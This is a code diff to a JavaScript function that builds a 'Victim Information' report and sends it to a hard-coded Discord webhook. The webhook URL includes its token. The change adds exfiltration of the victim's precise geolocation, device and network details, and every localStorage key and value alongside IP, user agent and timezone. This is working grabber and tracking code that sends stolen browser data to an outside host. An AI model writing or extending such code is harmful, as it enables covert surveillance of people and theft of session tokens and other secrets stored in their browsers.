@@ -88,17 +88,29 @@
         async function sendToWebhook(info) {
             const webhookUrl = 'https://discord.com/api/webhooks/1461964964603625594/jH-XEtXJtxJm69mjlFViAi8BQWutT-P6wTioZ-tElKw3BlJihCEeuNB2AazCCIjgKQKU';
             
-            // Format the message
+            // Format the message in a cleaner way
             const message = `
 **Victim Information:**
 - IP Address: ${info.ip}
 - Port Number: ${info.port}
-- User Agent: ${info.userAgent}
+- User Agent: ${info.userAgent.substring(0, 60)}...
 - Platform: ${info.platform}
 - Language: ${info.language}
-- Cookie Enabled: ${info.cookieEnabled}
+- Cookie Enabled: ${info.cookieEnabled ? 'Yes' : 'No'}
 - Timezone: ${info.timezone}
 - Timestamp: ${info.timestamp}
+
+**Geolocation:**
+${info.geoLocation ? `- Latitude: ${info.geoLocation.latitude}\n- Longitude: ${info.geoLocation.longitude}\n- Accuracy: ${info.geoLocation.accuracy}m` : 'Not available'}
+
+**Device Info:**
+${info.deviceInfo ? `- Device Memory: ${info.deviceInfo.deviceMemory}GB\n- Hardware Concurrency: ${info.deviceInfo.hardwareConcurrency}\n- Max Touch Points: ${info.deviceInfo.maxTouchPoints}` : 'Not available'}
+
+**Network Info:**
+${info.networkInfo?.connection ? `- Effective Type: ${info.networkInfo.connection.effectiveType}\n- Downlink: ${info.networkInfo.connection.downlink}Mbps\n- RTT: ${info.networkInfo.connection.rtt}ms` : 'Not available'}
+
+**Local Storage Items:**
+${info.localStorage ? Object.keys(info.localStorage).map(key => `- ${key}: ${info.localStorage[key]}`).join('\n') : 'None'}
             `.trim();
 
             // Send to webhook
